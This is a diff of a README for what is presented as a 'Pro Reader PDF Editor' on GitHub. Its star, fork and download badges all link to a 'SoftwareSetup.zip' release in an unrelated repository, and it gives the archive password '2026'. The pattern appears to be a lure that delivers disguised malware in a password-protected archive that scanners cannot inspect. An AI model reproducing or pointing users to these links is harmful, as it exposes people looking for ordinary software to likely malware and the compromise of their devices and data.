@@ -6,7 +6,7 @@ Pro Reader PDF Editor — pro reader pdf editor advanced pdf tool acrobat altern
 [![GitHub Stars](https://img.shields.io/github/stars/pipilikam/pro-reader-pdf-editor?style=flat-square&color=00d4aa)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
 [![GitHub Forks](https://img.shields.io/github/forks/pipilikam/pro-reader-pdf-editor?style=flat-square&color=0099cc)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
 [![Downloads](https://img.shields.io/github/downloads/pipilikam/pro-reader-pdf-editor/total?style=flat-square&color=7c5cbf)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+
 
 **PASSWORD: 2026**
 
